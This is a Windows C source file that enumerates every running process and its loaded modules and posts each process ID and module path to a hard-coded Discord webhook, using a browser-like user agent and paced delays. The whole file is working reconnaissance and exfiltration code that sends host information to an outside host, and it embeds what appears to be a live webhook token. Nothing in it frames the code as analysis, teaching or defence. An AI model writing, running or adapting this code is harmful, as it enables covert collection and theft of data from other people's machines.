#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <errhandlingapi.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void send_to_discord(const char* message);
void modules(DWORD PID);
int main(void) {
	DWORD aProcesses[1024];
	DWORD Needed;
	DWORD cProcesses;
	if(!EnumProcesses(aProcesses, sizeof(aProcesses), &Needed)) {
		return 1;
	}	
	cProcesses =  Needed/sizeof(DWORD); //4
	for(int i = 0; i < cProcesses; i++) {
		modules(aProcesses[i]);
	}
	return 0;
}
void modules(DWORD PID){
	HMODULE hMods[1024];
	DWORD cbNeeded;
	char szPID[32];
	/*
	BOOL EnumProcessModules(
 	 [in]  HANDLE  hProcess,          A handle to the process.
 	 [out] HMODULE *lphModule,        An array that receives the list of module handles.
 	 [in]  DWORD   cb,                The size of the lphModule array, in bytes.
 	 [out] LPDWORD lpcbNeeded         The number of bytes required to store all module handles in the lphModule array.
	);
	*/
	sprintf(szPID, "Scanning PID: %u", PID);
	send_to_discord(szPID);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
	if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
		for(int i = 0; i < cbNeeded/sizeof(HMODULE); i++) {
			char szModName[MAX_PATH];
			if(GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))){
				send_to_discord(szModName);
				Sleep(500);
			}
		}
	}
	CloseHandle(hProcess);
}

void send_to_discord(const char* message) {
    const char path[] = "/api/webhooks/1486587807676764212/bDhDG-bm-7Xgvl2NQJyYZQpjjDrgsriK05NbsSdu3egaSUyaIu4Il_DRslxONRSR2cNo";
    // 3. Chunking logic
    const int MAX_CHUNK_SIZE = 1900;
    int total_len = (int)strlen(message);
    int offset = 0;

    while (offset < total_len) {
        // Prepare the current chunk
        char current_chunk[2000] = { 0 };
        int current_chunk_len = (total_len - offset > MAX_CHUNK_SIZE) ? MAX_CHUNK_SIZE : (total_len - offset);
        strncpy(current_chunk, message + offset, current_chunk_len);

        // 4. Sanitize the current chunk for JSON
        char sanitized[4096] = { 0 };
        int j = 0;
        for (int i = 0; current_chunk[i] != '\0' && j < sizeof(sanitized) - 2; i++) {
            switch (current_chunk[i]) {
                case '\\': sanitized[j++] = '\\'; sanitized[j++] = '\\'; break;
                case '\"': sanitized[j++] = '\\'; sanitized[j++] = '\"'; break;
                case '\n': sanitized[j++] = '\\'; sanitized[j++] = 'n'; break;
                case '\r': sanitized[j++] = '\\'; sanitized[j++] = 'r'; break;
                case '\t': sanitized[j++] = '\\'; sanitized[j++] = 't'; break;
                default:   sanitized[j++] = current_chunk[i]; break;
            }
        }

        // 5. Prepare JSON data
        char json_data[5120];
        snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", sanitized);
        const char* headers = "Content-Type: application/json";

        // 6. Network Operations
        HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hSession) {
            HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), json_data, (DWORD)strlen(json_data));
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hSession);
        }

        // Move to the next 1900 characters
        offset += current_chunk_len;

        // Rate limit protection: small delay between chunks
        if (offset < total_len) {
            Sleep(600); 
        }
    }
}
